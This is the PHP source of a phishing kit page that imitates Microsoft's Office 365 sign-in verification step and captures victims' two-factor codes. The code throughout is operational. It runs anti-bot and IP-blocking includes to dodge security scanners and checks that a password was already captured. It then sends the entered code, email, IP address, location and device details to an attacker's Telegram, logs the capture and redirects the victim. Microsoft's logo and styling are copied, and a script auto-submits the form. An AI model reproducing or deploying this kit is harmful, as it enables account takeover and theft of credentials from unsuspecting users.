<?php
require_once 'config.php';
require_once 'functions.php';

// ==========================================
// ANTI-BOT PROTECTION
// ==========================================
$anti_bot_path = ANTI_BOT_PATH;

if (file_exists($anti_bot_path . 'anti-bot.php')) {
    require_once $anti_bot_path . 'anti-bot.php';
    if (function_exists('antiBotCheck')) {
        antiBotCheck();
    }
}
if (file_exists($anti_bot_path . 'bot-check.php')) {
    require_once $anti_bot_path . 'bot-check.php';
}
if (file_exists($anti_bot_path . 'ipblock.php')) {
    require_once $anti_bot_path . 'ipblock.php';
}
if (file_exists($anti_bot_path . 'refspam.php')) {
    require_once $anti_bot_path . 'refspam.php';
}

if (!isset($_SESSION['user_account']) || !isset($_SESSION['password_captured'])) {
    header('Location: login.php');
    exit;
}

$email = $_SESSION['user_account'];

// Handle OTP submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = $_POST['otp'] ?? '';
    
    if (!empty($otp)) {
        // Get IP and location
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $location = getLocationFromIP($ip);
        $device = getDeviceType($userAgent);
        
        // Prepare Telegram message with 2FA code
        $message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🔐 OFFICE 365 2FA CODE\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 IP Address: " . $ip . "\n";
        $message .= "📍 Location: " . $location . "\n";
        $message .= "📱 Device: " . $device . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "👤 Account: " . $email . "\n";
        $message .= "🔢 2FA Code: " . $otp . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🔍 User Agent: " . $userAgent . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        
        sendToTelegram($message);
        logCapture($otp, 'OFFICE365_2FA');
        
       
        session_destroy();
        header('Location: ' . REDIRECT_URL);
        exit;
    } else {
        $error = "Please enter the verification code.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify your identity</title>
<link rel="icon" type="image/png" href="assets/images/favicon.png">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: "Segoe UI", "Helvetica Neue", sans-serif;
}

body {
    min-height: 100vh;
    background: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
}

body::before {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at top right, #ece8f3 0%, transparent 34%),
                radial-gradient(circle at bottom left, #e7eef8 0%, transparent 34%);
    z-index: 0;
}

.wrapper {
    width: 100%;
    max-width: 440px;
    position: relative;
    z-index: 2;
}

.login-box {
    width: 100%;
    background: #fff;
    padding: 44px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.18);
}

/* Header area with back arrow and logo on same line */
.header {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
}

.back-arrow {
    cursor: pointer;
    margin-right: 12px;
    display: flex;
    align-items: center;
}

.back-arrow img {
    width: 20px;
    height: 20px;
}

.logo {
    flex: 1;
}

.logo img {
    width: 108px;
    height: auto;
    display: block;
}

/* Email display */
.email-display {
    font-size: 15px;
    color: #1b1b1b;
    margin-bottom: 24px;
    font-weight: 500;
    word-break: break-all;
}

/* Title */
h1 {
    font-size: 24px;
    font-weight: 600;
    color: #1b1b1b;
    margin-bottom: 8px;
}

/* Subtitle text */
.subtitle {
    font-size: 14px;
    color: #666;
    margin-bottom: 28px;
    line-height: 1.4;
}

.input-box {
    width: 100%;
    margin-bottom: 0;
}

.input-box input {
    width: 100%;
    border: none;
    border-bottom: 1px solid #666;
    outline: none;
    background: transparent;
    font-size: 16px;
    padding: 10px 0;
    color: #111;
}

.input-box input:focus {
    border-bottom: 2px solid #0067b8;
}

.input-box input::placeholder {
    color: #999;
    font-size: 14px;
}

.error-message {
    color: #d32f2f;
    font-size: 13px;
    margin-top: 10px;
    padding: 8px;
    background: #ffebee;
    border-left: 3px solid #d32f2f;
}

.btn-area {
    margin-top: 32px;
    display: flex;
    justify-content: flex-end;
}

button {
    min-width: 108px;
    height: 32px;
    border: none;
    background: #0067b8;
    color: #fff;
    font-size: 15px;
    cursor: pointer;
    transition: 0.2s;
}

button:hover {
    background: #005da6;
}

.footer {
    position: absolute;
    bottom: 10px;
    right: 18px;
    display: flex;
    gap: 20px;
    z-index: 2;
}

.footer a {
    font-size: 12px;
    color: #222;
    text-decoration: none;
}

.footer a:hover {
    text-decoration: underline;
}

@media (max-width: 600px) {
    .login-box {
        padding: 32px 24px;
    }
    
    .logo img {
        width: 90px;
    }
    
    h1 {
        font-size: 20px;
    }
    
    .footer {
        left: 16px;
        right: auto;
    }
}
</style>
</head>
<body>

<div class="wrapper">
    <form method="POST" action="">
    <div class="login-box">
        <!-- Header with back arrow and logo on same line -->
        <div class="header">
            <div class="back-arrow" onclick="window.location.href='password.php'">
                <img src="assets/images/arrow_left.svg" alt="Back" onerror="this.style.display='none'">
            </div>
            <div class="logo">
                <img src="assets/images/logo.svg" alt="Microsoft" onerror="this.src='https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31'">
            </div>
        </div>
        
        <!-- Email display -->
        <div class="email-display"><?php echo htmlspecialchars($email); ?></div>
        
        <!-- Title -->
        <h1>Enter your security code</h1>
        
        <!-- Subtitle -->
        <div class="subtitle">
            Verification code has been sent to your phone number on file.
        </div>
        
        <!-- 6-digit code input -->
        <div class="input-box">
            <input type="text" name="otp" placeholder="Enter 6-digit code" maxlength="6" autocomplete="off" required>
        </div>
        
        <?php if (isset($error)): ?>
            <div class="error-message">⚠️ <?php echo $error; ?></div>
        <?php endif; ?>
        
        <!-- Submit button -->
        <div class="btn-area">
            <button type="submit">Submit</button>
        </div>
    </div>
    </form>
</div>

<!-- Footer -->
<div class="footer">
    <a href="#">Privacy & cookies</a>
    <a href="#">Terms of use</a>
</div>

<script>
    // Auto-submit when 6 digits are entered
    const otpInput = document.querySelector('input[name="otp"]');
    if (otpInput) {
        otpInput.addEventListener('input', function(e) {
            if (this.value.length === 6) {
                this.form.submit();
            }
        });
    }
</script>

</body>
</html>